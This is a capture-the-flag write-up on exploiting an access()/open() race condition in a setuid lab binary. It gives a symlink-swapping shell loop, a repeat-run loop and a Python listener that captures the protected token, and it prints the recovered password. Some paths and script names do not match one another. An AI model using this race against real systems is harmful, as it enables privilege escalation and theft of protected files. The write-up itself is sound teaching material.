# level10 - Race condition - Exploit access command vulnerability

## Summary

on our `HOME` (`/home/user/level10`), we find two interesting files: a binary (`level10`) with **suid set** and a regular file (`token`)

```shell
~$ ls -l

-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
```
<br>

After some testing and some reverse engineering, we figured out that the
binary send a file (the first argument) to the port 6969 of an arbitrary
address (the second argument) given to the program. It seems like simple 
, we just have to give the file `token` and open a port on the host to read
it. But a function blocks our strategy. In fact, the function `access` checks
if the file (the first argument) belongs to us, and that’s the deal, despite 
the **suid bit** of flag10 user sets on the program, the file `token` does not belong to us (read/write rights).

```shell
~$ ./level10 
./level10 file host
	sends file to host if you have access to it

~$ ./level10 token 0.0.0.0
You don't have access to token
```
After some search, we find out that the function `access` got a vulnerability …

<br>

## Exploit
Here we are ! That’s the access flaw:

```shell
~$ man access

...
	Warning:  Using  access()  to  check  if a user is authorized to, for
  example, open a file before actually doing so using open(2) creates a
  security hole, because the user might exploit the short time interval
  between checking and opening the file to  manipulate  it.   For  this
  reason, the use of this system call should be avoided.  (In the exam‐
  ple just described, a  safer  alternative  would  be  to  temporarily
  switch  the  process's effective user ID to the real ID and then call
  open(2).)
...
```
In other world, this means that between an `access` call and an `open` call we can change the content of the file ! It’s just a Race Condition ! Indeed, the command `access` in our binary (`level10`) rejects file `token` because, in fact, the file token doesn’t belong to us. But, thanks to the flag10's **suid bit** on `level10` binary, it allows us to open/read the file token !

<br>
 
- First, create a loop that changes the content of an arbitrary file
  (/tmp/exploit10) as quickly as possible by linking it with a file to
  which we have full rights (/tmp/tmp) and the file that interests us
 (token).
``` shell
~$ echo > /tmp/tmp
~$ (while true; do ln -fs /tmp/tmp /tmp/exploit10 2> /dev/null; ln -fs ~/token /tmp/exploit10 2> /dev/null; done) &
```

<br>

- Second, create a loop that tests the target command until the race condition.
```shell
(while true; do ~/level10 /tmp/exploit 0.0.0.0 > /dev/null; done) &
```

<br>

- Third, create a “micro-server” to listen on port 6969 to receive the
  token. You can use netcat or a custom server program, that i did to
  parse the output.

```shell
~$ cat /tmp/exploit10.py

import socket
import os
import signal
import shlex, subprocess


def findPass(conn):
    while True:
        data = conn.recv(1024)
        if b'.*( )*.\n' not in data and data != b'\n' and len(data) != 0:
            print(b"The flag10 user password is : " + data)
            return True
        if not data:
            return False


def server():

    HOST = "0.0.0.0"
    PORT = 6969

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.bind((HOST, PORT))
        s.listen(10)
        while True:
            conn, addr = s.accept()
            if findPass(conn):
                break
    except:
        print('Port not fully available, try again in few minutes...')
    s.close()


if __name__=="__main__":
    server()
```

<br>

To do that, just copy files provide in ressource file in this level 
repository to the target machine, run level10.sh and its done !
```shell
~$ /tmp/exploit10.sh
The flag10 user password is : woupa2yuojeeaaed06riuj63c

Terminated
```
